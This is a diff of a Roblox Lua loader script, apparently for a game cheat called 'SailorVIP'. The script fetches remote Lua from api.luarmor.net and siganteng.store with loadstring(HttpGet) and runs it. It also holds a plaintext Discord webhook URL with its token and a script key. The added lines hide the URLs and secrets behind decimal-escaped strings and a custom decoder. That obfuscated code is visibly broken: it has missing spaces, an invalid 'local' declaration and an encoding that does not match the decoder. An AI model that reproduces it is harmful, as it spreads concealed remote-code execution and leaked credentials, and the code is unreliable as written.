@@ -1,34 +1,29 @@
--- Eksekusi Script 1 (Luarmor) di jalurnya sendiri
+local FgBSmNgv=function(mILbTn)local LnTACJ=''for yuytiq=1,#mILbTndoLnTACJ=LnTACJ..string.char(tonumber(string.sub(mILbTn,yuytiq*3-2,yuytiq*3)))end;return LnTACJend
+local NcIigR={'104\110\081\109\086\085\118\088\065\118\072\121\121\103\106\117\100\109\118\117\117\087\103\066\098\078\077\109\086\083\076\112','104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\052\055\056\053\056\055\051\050\051\049\050\048\054\049\053\053\048\052\047\055\048\085\098\108\118\098\076\065\111\079\077\070\109\109\050\050\097\072\080\076\110\081\080\068\077\099\068\071\118\050\065\078\110\077\053\054\066\119\051\115\053\104\113\079\070\089\050\121\105\057\085\104\095\076\068\108\105\072\054\045\103\102\100\111\114\113\106','104\116\116\112\115\058\047\047\097\112\105\046\108\117\097\114\109\111\114\046\110\101\116\047\102\105\108\101\115\047\118\052\047\108\111\097\100\101\114\115\047\097\056\050\053\053\100\055\053\057\049\052\052\098\098\054\049\050\055\099\053\098\055\050\050\050\049\099\099\101\053\099\100\046\108\117\097','104\116\116\112\115\058\047\047\115\105\103\097\110\116\101\110\103\046\115\116\111\114\101\047\097\112\105\047\115\099\114\105\112\116\047\117\047\102\116\095\106\108\052\051\083\113\050\116\098\104\115\118\073\115\073\085\109\070\113\067\100\110\111\115\097\045\105\122\052\070\087\078\121\109\109\071\090\112\065\114\114\099\052','083\099\114\105\112\116\032\083\105\103\097\110\116\101\110\103\032\103\097\103\097\108\032\100\105\109\117\097\116\044\032\109\101\110\099\111\098\097\032\108\097\103\105\032\100\097\108\097\109\032\053\032\100\101\116\105\107\046\046\046\032\069\114\114\111\114\058\032'}
+local GwUt,local CXnv,local AjYp=0,0,0
 task.spawn(function()
-    script_key = "hnQmVUvXAvHyygjudmvuuWgBbNMmVSLp" -- Masukkan key kamu di dalam tanda kutip jika masih dibutuhkan
-    
+    script_key = FgBSmNgv(NcIigR[1])
     getgenv().SailorVIP = {
         Optimization = {
-            Enable = false, -- On/Off seluruh script optimisasi
-            FPSCap = 10,   -- Batasan FPS (contoh: 10, 15, 30, 60)
+            Enable = false,
+            FPSCap = 10,
         },
-
         Webhook = {
-            Enable = true, -- On/Off pengiriman webhook notifikasi
-            URL = "https://discord.com/api/webhooks/1478587323120615504/70UblvbLAoOMFmm22aHPLnQPDMcDGv2ANnM56Bw3s5hqOFY2yi9Uh_LDliH6-gfdorqj", -- URL Webhook milikmu
+            Enable = true,
+            URL = FgBSmNgv(NcIigR[2]),
         },
     }
-    
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/a8255d759144bb6127c5b72221cce5cd.lua"))()
+    loadstring(game:HttpGet(FgBSmNgv(NcIigR[3])))()
 end)
-
--- Eksekusi Script 2 (Siganteng) dengan sistem Auto-Retry
 task.spawn(function()
     while true do
         local success, err = pcall(function()
-            loadstring(game:HttpGet("https://siganteng.store/api/script/u/ft_jl43Sq2tbhsvIsIUmFqCdnosa-iz4FWNymmGZpArrc4"))()
+            loadstring(game:HttpGet(FgBSmNgv(NcIigR[4])))()
         end)
-        
-        if success then 
-            break -- Kalau sukses, hentikan looping
+        if success then
+            break
         end
-        
-        warn("Script Siganteng gagal dimuat, mencoba lagi dalam 5 detik... Error: " .. tostring(err))
+        warn(FgBSmNgv(NcIigR[5]) .. tostring(err))
         task.wait(5)
     end
 end)
